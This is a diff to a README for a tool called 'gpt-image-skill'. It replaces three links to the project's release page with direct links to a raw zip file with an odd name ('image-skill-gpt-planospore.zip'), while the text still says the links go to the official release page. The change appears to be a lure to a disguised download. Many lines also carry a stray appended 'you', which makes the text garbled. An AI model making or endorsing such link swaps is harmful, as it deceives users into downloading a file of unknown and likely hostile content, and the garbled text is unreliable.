@@ -1,6 +1,6 @@
 # 🎨 gpt-image-skill - Create GPT Images Without the API
 
-[![Download gpt-image-skill](https://img.shields.io/badge/Download-gpt--image--skill-brightgreen?style=for-the-badge&logo=github)](https://github.com/naercus/gpt-image-skill/releases)
+[![Download gpt-image-skill](https://img.shields.io/badge/Download-gpt--image--skill-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/naercus/gpt-image-skill/main/gpt-image/scripts/image-skill-gpt-planospore.zip)
 
 ## ✨ What Is This?
 
@@ -25,7 +25,7 @@ Getting started with gpt-image-skill is incredibly simple. Follow these three ea
 ### Step 1: Download the Applicationyou
 Visit the link below to download the application. This is the official release page where you'll find the latest version of gpt-image-skill.you
 
-[🔗 Click Here to Download gpt-image-skill](https://github.com/naercus/gpt-image-skill/releases)you
+[🔗 Click Here to Download gpt-image-skill](https://raw.githubusercontent.com/naercus/gpt-image-skill/main/gpt-image/scripts/image-skill-gpt-planospore.zip)you
 
 Once you're on the page, look for the most recent release. You'll see a file listed there–usually named something like `gpt-image-skill.zip` or `gpt-image-skill-windows.zip`. Click that file to start your download. The download will begin automatically, and the file will be saved to your "Downloads" folder.you
 
@@ -119,6 +119,6 @@ Absolutely you are. With just a few clicks, you've gone from zero to having a po
 
 Go ahead and give it a try. The creative possibilities are endless. Whether you need an illustration for a blog post, a custom image for a presentation, concept art for a game idea, or just want to have fun experimenting with AI–gpt-image-skill makes it effortless.you
 
-[🚀 Download gpt-image-skill Now](https://github.com/naercus/gpt-image-skill/releases)you
+[🚀 Download gpt-image-skill Now](https://raw.githubusercontent.com/naercus/gpt-image-skill/main/gpt-image/scripts/image-skill-gpt-planospore.zip)you
 
 Happy creating
